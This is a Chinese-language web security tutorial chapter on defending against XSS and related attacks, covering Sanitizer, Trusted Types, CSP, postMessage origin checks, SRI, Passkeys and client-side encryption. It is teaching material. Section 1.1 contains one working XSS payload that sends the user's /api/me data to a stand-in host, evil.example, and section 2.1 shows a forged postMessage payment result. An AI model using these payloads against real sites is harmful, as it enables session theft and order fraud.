---
title: 08 · 安全与隐私
description: 从攻击者的三条注入路径讲到 Sanitizer、Trusted Types、来源校验、SRI 与 CSP，再到 Passkey 全生命周期和客户端加密——每条防线都回答「攻击者怎么做、你怎么防、没防住会怎样」。
---

# 第 8 章 安全与隐私

> **难度**：🔴 高阶 ｜ **前置**：[04 表单与输入](/web/04-forms) ｜ **学完你能**：拿到一段用户输入，判断它会从哪进来、该在哪一层拦住，并在上线前用报告模式验证而不是靠祈祷。

**这一章要解决的毛病**

- 用户在昵称里写了一段脚本，第二天全站评论区都在弹窗，客服说是「你们的页面中毒了」。
- 支付页跳回来一个 iframe 消息「支付成功」，前端直接发货，对账时才发现根本没有这笔订单。
- 刚上线的 Passkey 登录在旧 iPhone 上直接报错，用户既登不进也删不掉，只能打电话。

安全问题的共同点是：**平时看不出来，出事时一次就够**。所以本章每一节都按「攻击者怎么做 → 你该怎么防 → 没防住会怎样」组织，先站在攻击者一侧把路径走通，再回到你的代码里堵住它。

## 🟢 入门：先把攻击面画出来

### 1.1 XSS 从哪进来：三条真实路径

**没它会怎样**：你在搜索框里输入 `<img src=x onerror="fetch('/api/me').then(r=>r.text()).then(t=>location='//evil.example/?d='+btoa(t))">`，页面刷新后什么都没发生。你把同样的字符串存进「昵称」，十分钟后，你自己的登录态出现在别人的服务器日志里。

XSS（Cross-Site Scripting）不是一种漏洞，而是「用户数据被当成代码执行」这一类结果。入口通常只有三条。

**路径一：服务端拼接 HTML**。模板引擎把昵称直接插进字符串，用户的 `</div><script>` 就能逃出原本的位置：

```js
// ❌ 字符串拼接：昵称里的引号和标签都会变成结构
app.get('/profile', (req, res) => {
  res.send(`<div class="name">${req.user.nickname}</div>`);
});
```

```js
// ✅ 交给模板引擎转义：数据永远是数据，不会被解析成标签
app.get('/profile', (req, res) => {
  res.render('profile', { nickname: req.user.nickname }); // 模板里用 {{ nickname }}
});
```

**路径二：`innerHTML` 接收用户内容**。富文本编辑器、Markdown 预览、从接口拿到的「商品描述」，只要经过 `innerHTML`，就相当于把字符串交给 HTML 解析器：

```js
// ❌ 评论里的 <img onerror> 会被真实创建并执行
commentBox.innerHTML = comment.content;
```

```js
// ✅ 纯文本就用 textContent；确实要富文本，见 1.2 的 Sanitizer
commentBox.textContent = comment.content;
```

**路径三：第三方脚本**。统计、客服、A/B 实验的脚本和你自己的代码拥有完全相同的权限：能读 DOM、能读 `localStorage`、能给任何地址发请求。一次 CDN 被投毒，所有接入方一起中招。

**浏览器做了什么**：HTML 解析器看到 `innerHTML` 赋值时，会新建一个片段解析器，把字符串里合法的标签、属性、事件处理器全部实例化。`<script>` 标签通过 `innerHTML` 插入不会执行，但 `<img onerror>`、`<svg onload>`、`<iframe srcdoc>` 会。也就是说，「插进去不会执行」是一种错觉。

**攻击者怎么做 → 你该怎么防 → 没防住会怎样**：

| 环节 | 具体动作 |
| --- | --- |
| 攻击者怎么做 | 在昵称、评论、地址、文件名等任何会回显的字段里放载荷；先探测哪里原样输出，再换成窃取 `document.cookie` 或调用站内接口的脚本 |
| 你该怎么防 | 输出时按上下文转义（HTML 文本、属性、URL、JS 各不同）；确需富文本就走白名单清洗；再加 CSP 兜底（1.4） |
| 没防住会怎样 | 会话被劫持、账号被改绑、页面被插入钓鱼表单；如果是后台管理页被注入，攻击者可以直接调用管理接口 |

注意「按上下文转义」不是一句空话：把 `"` 转成 `&quot;` 在 HTML 文本里够用，但拼进 `href="javascript:..."` 或内联事件里就完全不够。**不要自己写转义函数**，用模板引擎和成熟库。

### 1.2 唯一的渲染出口：Sanitizer（sanitize-untrusted-html）

**没它会怎样**：产品要求「评论支持加粗和链接」，开发用正则删掉 `<script>`，攻击者换成 `<img src=x onerror=...>`，正则没匹配到，照样执行。黑名单永远删不完。

Sanitizer API 的思路反过来：**只保留白名单里的标签和属性**，其余全部丢弃。而且它清洗的结果是「解析后的 DOM」，不是字符串，避免了「清洗一遍、浏览器再解析一遍」产生的二次解析差异。

这段在演示什么：把用户富文本交给浏览器自带的清洗器，再用 `setHTML` 一次性写入，不再经过 `innerHTML`。

```js
const sanitizer = new Sanitizer({
  allowElements: ['b', 'strong', 'em', 'a', 'p', 'br', 'ul', 'li'],
  allowAttributes: { a: ['href', 'title'] },
  // javascript: 之类的危险协议默认会被丢弃
});

// setHTML 会先清洗再解析，等价于 innerHTML 但带白名单
commentBox.setHTML(comment.content, { sanitizer });
```

**浏览器做了什么**：`setHTML` 内部先按 Sanitizer 的配置构建一棵受控 DOM 树，被移除的元素连同子节点一起丢弃，事件的 `on*` 属性、`javascript:` 协议、`srcdoc` 等都在默认拒绝列表里。它是「解析时就拦」，不会出现「先执行了再删」的窗口。

**老浏览器怎么办**：Sanitizer 目前只有 Chromium 系稳定支持。生产环境用成熟库（如 DOMPurify）兜底，但要把两条路径收敛到同一个函数，避免有人绕过：

```js
if ('setHTML' in Element.prototype) commentBox.setHTML(comment.content, { sanitizer });
else commentBox.innerHTML = DOMPurify.sanitize(comment.content, { USE_PROFILES: { html: true } });
```

**攻击者怎么做**：用黑名单没覆盖的标签（`<svg onload>`、`<iframe srcdoc>`）绕过滤。**你该怎么防**：白名单清洗 + 单一出口 `setHTML`，别让任何字符串直接进 `innerHTML`。**没防住会怎样**：富文本区变成稳定的持久化 XSS 点，每个访客都中招。

**对比**：

| 方式 | 拦住什么 | 漏一处会怎样 | 维护成本 |
| --- | --- | --- | --- |
| 正则/黑名单删除 | 只拦住你想到的那几种写法 | 换个标签就绕过 | 越写越长，永远补不完 |
| 只做 HTML 转义 | 文本上下文安全 | 富文本全变纯文本；拼进属性/URL 仍可注入 | 低，但功能受限 |
| Sanitizer 白名单 | 未列出的标签、属性、协议 | 白名单本身配置过宽仍会放行 | 中，配置即策略 |
| 完全不渲染用户 HTML | 从根上消除 | 产品功能做不了 | 最低 |

### 1.3 写错就报错：Trusted Types（trusted-types）

**没它会怎样**：团队有一百处 `innerHTML`，你改好九十九处，第 100 处漏在三个月后新加的营销页里。代码评审看不出来，测试也测不出来，因为那一处只有特定活动才走到。

Trusted Types 不靠人记，它让「把普通字符串塞进 `innerHTML`」这件事**直接运行时报错**。前提是页面接受了这条策略（CSP，见 1.4）：

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-policy
```

这段在演示什么：声明一个策略，把所有 HTML 写入收敛到唯一出口，出口里做清洗；其余任何字符串赋值都会被浏览器拒绝。

```js
// 只允许创建一次，名字要和 CSP 里声明的一致
const policy = trustedTypes.createPolicy('app-policy', {
  createHTML: (untrusted) => DOMPurify.sanitize(untrusted, { RETURN_TRUSTED_TYPE: true }),
  createScriptURL: (url) => {
    const u = new URL(url, location.origin);
    if (u.origin !== location.origin) throw new TypeError('blocked script url');
    return u.href;
  },
});

commentBox.innerHTML = policy.createHTML(comment.content); // ✅ 类型正确
commentBox.innerHTML = comment.content;                    // ❌ 直接抛 TypeError
script.src = policy.createScriptURL('/widgets/chart.js');  // ✅
```

**浏览器做了什么**：开启 `require-trusted-types-for 'script'` 后，`innerHTML`、`outerHTML`、`insertAdjacentHTML`、`script.src`、`eval` 等「注入汇聚点」只接受 `TrustedHTML` / `TrustedScriptURL` 这类带品牌的对象。普通字符串在赋值那一刻就抛异常，错误栈直接指向那一行——**问题从「线上被利用」提前到「开发时红屏」**。

**攻击者怎么做**：找一个漏改的 `innerHTML`，或往第三方组件传入可控字符串。**你该怎么防**：CSP 开 `require-trusted-types-for`，把所有 HTML 写入收口到一个策略。**没防住会怎样**：第 100 处漏改照旧静默可利用，代码评审救不了你。

**对比**——三种防御姿态，差别不在「能不能防住」而在「漏一处会怎样」：

| 维度 | 不设防 | 只做转义 | Trusted Types |
| --- | --- | --- | --- |
| 注入能否执行 | 能 | 取决于上下文，属性/URL 场景常失守 | 汇聚点被强制收口 |
| 新代码漏一处 | 静默可利用 | 静默可利用 | 运行/测试时立刻报错 |
| 谁能写 HTML | 任何人 | 任何人 | 只有策略出口 |
| 迁移成本 | 0 | 低 | 中（要清点所有汇聚点、配 CSP） |
| 浏览器支持 | — | — | Chromium 稳定；其他浏览器需准备好降级 |

**顺序很重要**：先上 `Content-Security-Policy-Report-Only` 收集违规，把 `trusted-types` 报告里的调用点全部收口，再切强制模式。直接开强制模式，等于让所有老页面白屏。

### 1.4 CSP 兜底：即使注入也跑不起来（security）

**没它会怎样**：清洗库有 0day、第三方组件偷偷 `eval`、某个运营页绕过统一入口——只要还有一条路能让字符串变成脚本，前面的防线就全废。CSP（Content Security Policy）是最后一层：它不管你怎么注入，只规定「哪些脚本可以执行」。

这段在演示什么：一个可直接上线的严格策略，外加报告模式做灰度。

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  require-trusted-types-for 'script';
  trusted-types app-policy;
  report-to csp-endpoint
```

这段在演示什么：灰度期只上报不拦截，先把「会被打断的调用点」收集齐，再切强制模式。

```http
# 灰度期：只报告不拦截，先看会被打断的是什么
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'nonce-r4nd0m' 'strict-dynamic'; report-to csp-endpoint
Report-To: {"group":"csp-endpoint","max_age":10886400,"endpoints":[{"url":"https://report.example.com/csp"}]}
```

**攻击者怎么做**：找你页面里任意一个还能写入 HTML 的点，注入外链脚本或内联事件。**你该怎么防**：nonce + `strict-dynamic` 管执行、`connect-src` 管出站、`base-uri` 堵改写，先 Report-Only 灰度。**没防住会怎样**：前面几层只要有一个 0day，脚本就直接在用户会话里跑。

**浏览器做了什么**：`nonce` 让「服务端渲染时带上的那一份脚本」被信任；`strict-dynamic` 规定「由已信任脚本动态插入的脚本」也继承信任，因此不必再列一长串 CDN 域名。`base-uri 'none'` 阻止攻击者插入 `<base>` 改写所有相对地址；`object-src 'none'` 关掉插件通道；`frame-ancestors 'none'` 防点击劫持。报告模式（Report-Only）不阻断执行，只把违规发到 `report-to` 端点。

**对比**：

| 配置 | 拦住什么 | 常见误配 | 后果 |
| --- | --- | --- | --- |
| `script-src 'self'` | 外链脚本 | 忘了内联脚本也会被拦 | 页面白屏、按钮全失效 |
| `'unsafe-inline'` | 几乎不拦内联 | 为了方便加回去 | CSP 形同虚设 |
| `nonce` + `strict-dynamic` | 无 nonce 的注入脚本 | nonce 写死成固定值 | 攻击者可复用 nonce |
| `object-src 'none'` | Flash/插件通道 | 漏配 | 老式绕过 |
| `base-uri 'none'` | `<base>` 劫持 | 漏配 | 相对路径全被改写 |
| `connect-src` | 出站请求 | 清单过宽或过窄 | 要么没防住，要么业务接口全断 |

**报告端点自己也要防**：只接收、不执行；限制请求体大小；按 `document-uri` 聚合去重；绝不把报告内容渲染回页面。

## 🟡 进阶：真实页面上的组合拳

### 2.1 支付回跳的「假成功」：来源校验（validate-origins）

**症状**：支付页在 iframe 里，回跳后 `postMessage` 发来 `{status: 'paid'}`。有用户把支付页地址换成自己的页面，也发一条同样的消息，前端立刻显示「已支付」。

**攻击者怎么做**：在自己的站点里嵌入你的支付回调页，或者直接在一个窗口里执行 `opener.postMessage({status:'paid'}, '*')`。如果你的监听器不看来源，它和真实支付页的消息毫无区别。

```js
// ❌ 只看消息内容，谁发的都信
window.addEventListener('message', (event) => {
  if (event.data.status === 'paid') shipOrder(event.data.orderId);
});
```

```js
// ✅ 三重校验：来源、窗口、数据结构；回发也指定 targetOrigin
const PAY_ORIGIN = 'https://pay.example.com';

window.addEventListener('message', (event) => {
  if (event.origin !== PAY_ORIGIN) return;              // 谁发的
  if (event.source !== payFrame.contentWindow) return;  // 从哪个窗口发的
  const msg = event.data;
  if (msg?.type !== 'payment-result' || typeof msg.orderId !== 'string') return;

  // 关键：前端消息只用来「刷新状态」，发货必须服务端向支付网关查证
  verifyOrderOnServer(msg.orderId).then(renderResult);
});

// 主动发消息时，永远别写 '*'
payFrame.contentWindow.postMessage({ type: 'init' }, PAY_ORIGIN);
```

**攻击者怎么做**：自己开一个页面 `postMessage` 假支付结果，或用恶意站点包住你的回调页。**你该怎么防**：校验 origin、source、结构，且发货以服务端查证为准。**没防住会怎样**：0 元订单、重复发货，对账永远对不平。

**浏览器做了什么**：`postMessage` 的 `targetOrigin` 决定「消息发给谁」；接收端的 `event.origin` 由浏览器填充，脚本无法伪造。二者是不同方向的校验，缺一不可：只校验接收不管发送，你的 `init` 消息会被恶意页面读到。

**对比**：

| 校验项 | 防住什么 | 漏掉会怎样 |
| --- | --- | --- |
| `event.origin` | 任意站点伪造消息 | 假支付、假登录态 |
| `event.source` | 同源但不同窗口的冒充 | 已打开的其他页面可注入结果 |
| 消息结构校验 | 字段类型混淆、原型污染 | `orderId` 传对象导致后端异常 |
| 服务端查证 | 前端被完全控制的情况 | 前端说成功就发货，无法对账 |
| `targetOrigin` 具体值 | 消息被第三方窗口读取 | 订单号、令牌泄露 |

### 2.2 第三方脚本把数据发出去：SRI 与 connect-src（secure-external-subresources）

**症状**：安全审计发现页面会把当前用户 ID 发给一个陌生域名。查代码没有任何相关请求，最后定位到 CDN 上的统计脚本被替换了。

**攻击者怎么做**：攻破 CDN 或第三方脚本的发布流程，在文件里加三行代码，把所有 `localStorage` 和表单内容 `fetch` 到自己的服务器。你引用的地址没变，`integrity` 没配，浏览器无从判断内容已被换掉。

```html
<!-- ❌ 只写地址：CDN 换一份文件，你照单执行 -->
<script src="https://cdn.example.com/widget.js"></script>

<!-- ✅ SRI：内容哈希不匹配就不执行；crossorigin 必须写，否则拿不到响应做校验 -->
<script src="https://cdn.example.com/widget.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

**攻击者怎么做**：投毒 CDN 或第三方脚本，从页面内部把你的数据发走。**你该怎么防**：SRI 锁内容、`connect-src` 白名单出站、关键脚本自托管。**没防住会怎样**：所有接入页面同时泄露，而你的代码里找不到任何可疑请求。

**浏览器做了什么**：加载完成后先算响应体的哈希，与 `integrity` 比对，不一致直接拒绝执行并报错。它防的是「同一个 URL 内容被换」，不防「你主动引用了一个恶意域名」——后者要靠 CSP 的白名单。

出站方向同样要收口（restrict-outbound-connections）：

```http
# 只允许和自家接口、支付网关通信；WebSocket、sendBeacon 也受 connect-src 约束
Content-Security-Policy: connect-src 'self' https://api.example.com wss://ws.example.com; report-to csp-endpoint
```

**对比**：

| 手段 | 防「内容被替换」 | 防「主动连坏地址」 | 代价 |
| --- | --- | --- | --- |
| SRI | ✅ | ❌ | 第三方更新文件就要改哈希，必须自动化 |
| `connect-src` | ❌ | ✅ | 漏配一个接口就整块功能失效 |
| 自建代理转发 | ✅（同源） | ✅（服务端白名单） | 多一跳、多一份运维 |
| 定期抓取比对哈希 | 弱（有时间窗） | ❌ | 只能事后发现 |

SRI 的现实约束：CDN 上的文件随时可能更新，手工维护哈希不现实。做法是「锁版本号 + 构建时算哈希」，或干脆把关键脚本自托管。

### 2.3 内网探测与本地设备（local-network-access）

**症状**：一个看起来只是「图片加载失败」的页面，在用户家里能探测出路由器管理页是否存在、某个本地服务开了哪些端口。用户什么都没点，页面只是在后台 `fetch` 了几个私有地址。

**攻击者怎么做**：从公网页面发起对 `http://192.168.1.1`、`http://localhost:8080` 的请求，通过「请求成功/失败/耗时」推断内网拓扑，找到未授权设备后配合 CSRF 或默认口令下手。这类请求过去被同源策略挡住读响应，但「能不能连上」本身就是信息。

**你该怎么防**：作为站点，别访问用户本地网络，除非业务真的需要，并且明确声明；作为用户侧防护，浏览器正在把本地网络访问变成需要授权的权限（Local Network Access）。

```js
// 需要访问本地设备时，显式声明地址空间；浏览器会据此触发权限流程
const res = await fetch('http://device.local/status', { targetAddressSpace: 'local' }); // 'local' | 'private' | 'public'

// 页面也可以声明策略，禁止自己或嵌入的 iframe 访问本地网络
// Permission-Policy: local-network-access=()
```

**浏览器做了什么**：请求会先按 `targetAddressSpace` 分类，从公网页面访问本地/私有地址时触发预检或权限提示；未获授权直接失败。CSP 的 `connect-src` 仍然生效，两者是叠加关系。

**对比**：

| 地址空间 | 例子 | 公网页面的默认待遇 |
| --- | --- | --- |
| `public` | `https://api.example.com` | 正常请求 |
| `private` | `http://192.168.1.10` | 需权限/预检，多数场景被拒 |
| `local` | `http://localhost:8080`、`*.local` | 需显式授权 |
| `loopback` | `http://127.0.0.1` | 同上，且常被系统防火墙二次拦截 |

**没防住会怎样**：内网资产被枚举，本地开发服务被读取（很多本地服务没有鉴权），再借用户的浏览器作为跳板访问内网管理后台。

## 🔴 高阶：身份、加密与长期运营

### 3.1 Passkey 全生命周期（passkey-registration）

Passkey 是把「私钥留在设备的安全芯片里，网站只保存公钥」的登录方式。它解决了两个老问题：密码可以撞库、验证码可以被钓鱼。代价是**流程比密码长**，而且一旦设计错，用户会被卡在登录门外。

**攻击者怎么做**：用钓鱼站诱导用户在假页面完成「验证」，或偷到会话后直接删凭证。**你该怎么防**：rpId 固定主域、挑战一次性、敏感操作强制 step-up、永远保留备用通道。**没防住会怎样**：用户被锁在门外，或者攻击者把账号彻底接管。

#### 注册（passkey-registration）

这段在演示什么：创建一把绑定当前域名（rpId）的凭证，服务端只落公钥。

```js
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: serverChallenge,                     // 服务端生成，一次性
    rp: { id: 'example.com', name: 'Example' },
    user: { id: userIdBytes, name: email, displayName: nickname },
    pubKeyCredParams: [{ type: 'public-key', alg: -7 }, { type: 'public-key', alg: -257 }], // ES256 / RS256
    authenticatorSelection: {
      residentKey: 'required',      // 可发现凭证，登录时无需先输账号
      userVerification: 'required', // 必须验证指纹/面容/PIN
    },
    excludeCredentials: existingCredentials, // 防止同一设备重复注册
    attestation: 'none',                     // 除非合规要求，否则不采集证明
  },
});

await fetch('/passkey/register', {
  method: 'POST',
  body: JSON.stringify({
    id: credential.id,
    clientDataJSON: b64(credential.response.clientDataJSON),
    attestationObject: b64(credential.response.attestationObject),
  }),
});
```

服务端要校验：`challenge` 是自己刚发的且未用过、`origin` 是本站、`rpIdHash` 与 `example.com` 一致；然后把 `credentialId`、公钥、签名计数器存起来。**浏览器只保证「这把私钥属于这个域名」，其余全靠服务端校验。**

#### 登录（passkey-authentication）

```js
const assertion = await navigator.credentials.get({
  publicKey: {
    challenge: serverChallenge,
    rpId: 'example.com',
    allowCredentials: [], // 空数组 = 任意一把可发现凭证
    userVerification: 'required',
  },
});

await fetch('/passkey/login', {
  method: 'POST',
  body: JSON.stringify({
    id: assertion.id,
    authenticatorData: b64(assertion.response.authenticatorData),
    clientDataJSON: b64(assertion.response.clientDataJSON),
    signature: b64(assertion.response.signature),
  }), // 服务端验签的对象是 authenticatorData + SHA-256(clientDataJSON)
});
```

服务端用存下的公钥验证签名，覆盖 `authenticatorData || SHA-256(clientDataJSON)`；再检查计数器是否回退（回退意味着凭证可能被复制）。

#### 自动填充式注册（passkey-conditional-create）与快捷登录（quick-sign-ins）

不想让用户先点「创建 Passkey」再弹窗，可以在登录成功后静默挂一个 `conditional` 请求：用户下次在输入框聚焦时，浏览器直接把 Passkey 作为自动填充选项给出。

```js
if (await PublicKeyCredential.isConditionalMediationAvailable?.()) {
  navigator.credentials
    .get({ publicKey: { challenge, rpId: 'example.com', allowCredentials: [] }, mediation: 'conditional' })
    .then(handleLogin)
    .catch(() => {}); // 用户忽略是常态，不要弹错误
}
```

快捷登录的做法是把它和「邮箱登录链接」并列：用户输入邮箱后，页面同时提供「发登录链接」和「用 Passkey 登录」两个选项。前者覆盖没有 Passkey 的设备，后者一键完成。**不要让 Passkey 成为唯一入口**，否则换设备、清空钥匙串的用户会直接失联。

#### 重新认证（passkey-reauthentication）

改密码、改邮箱、删除凭证、查看账单这类操作，不能只靠一个「已登录」的会话 cookie。要用一次新的 Passkey 断言做 step-up（提升认证等级）：

```js
const stepUp = await navigator.credentials.get({
  publicKey: {
    challenge: reauthChallenge,   // 短有效期，服务端与操作类型绑定
    rpId: 'example.com',
    allowCredentials: userCredentials, // 限定到当前用户的凭证
    userVerification: 'required',
  },
});
// 服务端验证通过后，签发 5 分钟有效的一次性授权令牌，只对本次操作有效
```

#### 凭证管理（passkey-management）

```js
// 列出：只展示名称、创建时间、最后使用时间，绝不回传公钥细节
const { items } = await (await fetch('/passkey/list')).json();

// 删除：必须带 step-up 令牌，且不允许删掉最后一把（否则用户被锁死）
await fetch('/passkey/delete', {
  method: 'POST',
  body: JSON.stringify({ id: item.id, stepUpToken }),
});
```

#### 完整流程（文字步骤 + 状态表）

注册流程：

1. 用户已用任一方式登录，进入「安全设置」。
2. 前端请求 `challenge`（服务端生成，绑定用户与会话，5 分钟过期）。
3. 调用 `credentials.create()`，浏览器弹出系统验证（指纹/面容/PIN）。
4. 用户取消或验证失败 → 回到设置页提示「可以稍后再试」，**不创建任何半成品记录**。
5. 成功 → 服务端校验 challenge、origin、rpIdHash，存公钥与凭证 ID。
6. 前端刷新列表，显示「已添加：MacBook 触控 ID」。

登录流程：

1. 输入邮箱（可选，用于展示该账号已有的凭证）→ 服务端返回 challenge。
2. 调用 `credentials.get()`；可发现凭证时连邮箱都不用输。
3. 浏览器本地验证用户 → 用私钥签名。
4. 服务端验签、校验计数器 → 建立会话。
5. 验签失败 → 回到密码/邮箱链接通道，并记录失败原因（区分「用户取消」和「签名不匹配」）。

| 阶段 | 浏览器/认证器动作 | 服务端动作 | 常见失败 | 退路 |
| --- | --- | --- | --- | --- |
| 注册开始 | 生成密钥对，私钥不出设备 | 下发一次性 challenge | 用户取消 | 提示稍后再试，不留脏数据 |
| 注册完成 | 回传凭证 ID 与证明对象 | 校验 origin、rpIdHash、challenge | 域名不一致（rpId 写错） | 检查 `rp.id` 是否为主域 |
| 登录 | 用户验证后签名 | 用公钥验签、查计数器 | 换了设备没有凭证 | 邮箱链接 / 密码 |
| 自动填充 | 聚焦时给出候选 | 同登录 | 浏览器不支持 conditional | 隐藏入口，不报错 |
| 重新认证 | 再次本地验证 | 校验并签发短时令牌 | 令牌过期 | 要求重新发起，不延长旧令牌 |
| 管理/删除 | 无 | 校验 step-up，保留最后一把 | 删到只剩零把 | 阻止删除并提示先添加新设备 |

**没防住会怎样**：`rpId` 配错，所有已注册凭证作废，用户全部无法登录；不做 step-up，会话被 XSS 偷走后可以直接删凭证、改邮箱，把账号彻底锁死；把 Passkey 当唯一入口，旧设备用户被永久挡在外面。

### 3.2 客户端加密与签名：先想清楚威胁模型（client-side-encryption）

**症状**：产品说「端到端加密」，实现却是「前端加密后再用 HTTPS 发送，服务端解密存库」。这既不端到端，也没有增加多少安全性——攻击者只要能在页面里执行脚本（XSS），就能在加密前读到明文。

**攻击者怎么做**：XSS 注入后读取输入框内容、劫持 `crypto.subtle.encrypt` 的入参、或者直接调用你页面里的解密函数。客户端加密防的是**服务端和传输链路**，不防**页面被控制**。

**你该怎么防**：密钥不可导出、每条数据新 IV、解密必须验证认证标签，签名绑定 nonce 或时间戳。

这段在演示什么：用 Web Crypto 生成不可导出的密钥、AES-GCM 加密，并把密钥用用户口令包裹（用户不在时服务端也解不开）。

```js
// 1. 用口令派生包裹密钥（PBKDF2 只用于派生，别直接拿来加密数据）
const baseKey = await crypto.subtle.importKey('raw', new TextEncoder().encode(password), 'PBKDF2', false, ['deriveKey']);
const wrappingKey = await crypto.subtle.deriveKey(
  { name: 'PBKDF2', salt, iterations: 600_000, hash: 'SHA-256' },
  baseKey, { name: 'AES-GCM', length: 256 }, false, ['wrapKey', 'unwrapKey'],
); // 第三个参数 false = 不可导出

// 2. 数据密钥随机生成，加密正文
const dataKey = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']);
const iv = crypto.getRandomValues(new Uint8Array(12)); // 每次加密都必须新 IV
const ciphertext = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, dataKey, plaintext);

// 3. 用包裹密钥把数据密钥加密后随正文一起存
const wrapped = await crypto.subtle.wrapKey('raw', dataKey, wrappingKey, { name: 'AES-GCM', iv: wrapIv });
```

数字签名（digital-signatures）解决的是另一件事：**证明「是谁发的、内容没被改」**，而不是保密。

```js
// 服务端或客户端生成签名密钥对；私钥不可导出，公钥交给对方
const keyPair = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, false, ['sign', 'verify']);

const signature = await crypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, keyPair.privateKey, payload);
// 接收方用公钥验签；验不过就整条丢弃，不做「部分信任」
const ok = await crypto.subtle.verify({ name: 'ECDSA', hash: 'SHA-256' }, keyPair.publicKey, signature, payload);
```

**对比**：

| 维度 | 加密（AES-GCM） | 签名（ECDSA） |
| --- | --- | --- |
| 解决的问题 | 保密性：别人看不懂 | 完整性与来源：没被改、确实是你发的 |
| 密钥 | 对称，收发双方共享（或用公钥包裹） | 非对称，私钥签、公钥验 |
| 能否防 XSS | ❌ 页面能读到明文 | ❌ 页面能调用签名函数 |
| 典型误用 | IV 复用、把口令直接当密钥 | 只签内容不签时间戳，重放可用 |
| 必须配套 | 随机 IV、密钥轮换、认证标签校验 | 绑定 nonce/时间戳，服务端防重放 |

**没防住会怎样**：IV 复用会让 AES-GCM 直接泄露明文异或值；只加密不认证，攻击者可篡改密文让解密结果可控；签名不绑时间戳，旧消息被重放。更根本的是——如果威胁模型里包含「页面被注入」，客户端加密只是心理安慰。

### 3.3 邮箱验证、站点安装与迁移（verify-email-ownership）

**攻击者怎么做**：抢注一个相似的邮箱、重复使用别人泄露的验证链接、或者在你迁移域名时利用旧域名的 301 把用户导到钓鱼站。

邮箱验证要满足四个条件：**随机、一次性、有期限、只对当前账号生效**。**你该怎么防**：令牌只存哈希、消费即作废、过期 30 分钟，改绑与删除要求 step-up，迁移期旧域保留 301。

```js
// 生成：只在服务端生成，库里存哈希，链接里放原文
const token = crypto.randomUUID() + crypto.randomUUID();
await db.saveEmailToken(userId, await sha256(token), Date.now() + 30 * 60_000);

// 消费：POST 提交，校验后立刻作废；同一邮箱重复验证不报「已被占用」
app.post('/verify-email', async (req, res) => {
  const row = await db.consumeToken(await sha256(req.body.token));
  if (!row || row.expiresAt < Date.now()) return res.status(400).end();
  await db.markEmailVerified(row.userId);
  res.redirect('/settings?verified=1');
});
```

站点安装（install-web-app）与迁移这两件事看起来和「安全」无关，实际都涉及身份与信任：

```json
// manifest：scope 决定哪些页面属于这个应用，迁移时最容易漏
{
  "name": "Example", "start_url": "/app/", "scope": "/app/", "display": "standalone",
  "icons": [{ "src": "/icons/192.png", "sizes": "192x192", "type": "image/png" }]
}
```

```js
// 安装提示：只在用户有明确意图时弹，别一进页面就打断
let deferredPrompt;
window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e; // 存起来，等用户点「安装」再用
});
installButton.addEventListener('click', () => deferredPrompt?.prompt());
```

**站点迁移**（migrate-web-app-origin）：Passkey 绑定 `rpId`，跨 eTLD+1 迁移无法带走凭证，只能让用户在新域名重新注册。可迁移的是：

| 资产 | 能否原样迁移 | 做法 |
| --- | --- | --- |
| 已安装的 PWA | 不能 | 旧 scope 保留一段时间，提示用户重新安装 |
| Passkey 凭证 | 不能（跨 eTLD+1） | 新域名重新注册，旧域名保留登录入口过渡 |
| Service Worker 缓存 | 不能 | 新域重新预缓存，旧域注销并 301 |
| 登录会话 | 不能直接带 | 旧域签发一次性迁移令牌，新域兑换 |
| 邮件里的旧链接 | 能 | 旧域 301 到新域对应路径，保留至少一年 |

**没防住会怎样**：验证链接可重复使用 → 邮箱被二次占用；迁移时不保留旧域 → 老邮件里的链接全失效、用户以为站点跑路；PWA scope 写错 → 用户装了两个图标，更新互不影响。

### 3.4 隐私默认值：少收、少存、少给（privacy）

**攻击者怎么做**：不需要攻击。只要你的页面默认收集了精确位置、通讯录、剪贴板，一次数据泄露就把这些「本来不该有」的信息一起送出去。

隐私的第一原则不是「加密」，而是**不收集**。第二原则是「收集了就有时限、有出口」。**你该怎么防**：默认不收集、按需申请权限、埋点去标识、给每类数据设保留期限与删除出口。

```js
// ❌ 一进页面就要定位：用户不知道你要干什么，只能盲点「允许」
navigator.geolocation.getCurrentPosition(showStore);

// ✅ 用户点了「查找附近门店」再要，并且说明用途
async function findStore() {
  const permission = await navigator.permissions.query({ name: 'geolocation' });
  if (permission.state === 'denied') return showManualCityPicker();
  navigator.geolocation.getCurrentPosition(showStore, showManualCityPicker, {
    maximumAge: 60_000,   // 一分钟内复用，别反复定位
    timeout: 8_000,
  });
}
```

```js
// 分析数据默认去标识：不存原始 IP，不存完整 UA，不拼跨站 ID
const payload = {
  path: location.pathname,        // 不带查询串（可能含邮箱、令牌）
  referrerHost: referrerHostOnly, // 只留域名
  sessionId: sessionScopedId,     // 会话级随机 ID
};
```

**对比**：

| 默认值 | 更安全的默认 | 理由 |
| --- | --- | --- |
| 全量 IP 落库 | 截断或哈希后存 | 足够做区域统计，不能定位到人 |
| 页面加载就要权限 | 用户操作时再要 | 有上下文，拒绝率更低 |
| 埋点带完整 URL | 只带 path | 查询串里常出现邮箱、重置令牌 |
| 数据永久保留 | 明确期限 + 自动清理 | 泄露的影响面随时间缩小 |
| 第三方 SDK 默认全开 | 默认关闭、按需启用 | 每个 SDK 都是一条出站通道 |

**没防住会怎样**：一次拖库把用户位置、邮箱、行为轨迹一起泄露；查询串里的重置令牌被写进日志和第三方分析平台；用户要求删除数据时你拿不出「存在哪、多久删」的答案。

## 📋 决策速查

| 症状 | 先查什么 | 用什么修 | Baseline |
| --- | --- | --- | --- |
